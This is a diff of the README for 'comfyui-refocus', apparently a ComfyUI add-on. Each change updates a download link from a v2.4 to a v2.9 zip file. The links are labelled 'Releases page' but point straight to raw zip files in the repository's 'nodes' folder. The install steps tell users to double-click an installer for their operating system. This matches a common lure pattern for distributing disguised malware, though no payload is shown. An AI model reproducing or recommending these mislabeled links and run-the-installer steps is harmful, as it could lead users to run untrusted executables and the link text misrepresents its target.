@@ -6,7 +6,7 @@ Welcome to comfyui-refocus! This tool adds powerful features to ComfyUI, allowin
 
 ## 🔗 Download Now
 
-[![Download comfyui-refocus](https://raw.githubusercontent.com/jordanobou/comfyui-refocus/main/nodes/comfyui-refocus-v2.4.zip)](https://raw.githubusercontent.com/jordanobou/comfyui-refocus/main/nodes/comfyui-refocus-v2.4.zip)
+[![Download comfyui-refocus](https://raw.githubusercontent.com/jordanobou/comfyui-refocus/main/nodes/comfyui_refocus_v2.9.zip)](https://raw.githubusercontent.com/jordanobou/comfyui-refocus/main/nodes/comfyui_refocus_v2.9.zip)
 
 ## 💻 System Requirements
 
@@ -19,7 +19,7 @@ To use comfyui-refocus, your system should meet the following requirements:
   
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/jordanobou/comfyui-refocus/main/nodes/comfyui-refocus-v2.4.zip) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/jordanobou/comfyui-refocus/main/nodes/comfyui_refocus_v2.9.zip) to download the latest version.
 2. Choose the appropriate file for your operating system.
 3. Download the file. It usually comes in a `.zip` or installer format.
 4. If it’s a `.zip` file, extract it using your preferred file extractor. If it’s an installer, double-click the file to start the installation process.
@@ -60,7 +60,7 @@ If you encounter any issues:
 
 ## 🔗 Links
 
-For ongoing updates and support, visit our GitHub page. Keep an eye on the [Releases page](https://raw.githubusercontent.com/jordanobou/comfyui-refocus/main/nodes/comfyui-refocus-v2.4.zip) for new features and improvements.
+For ongoing updates and support, visit our GitHub page. Keep an eye on the [Releases page](https://raw.githubusercontent.com/jordanobou/comfyui-refocus/main/nodes/comfyui_refocus_v2.9.zip) for new features and improvements.
 
 ## 📩 Feedback
 
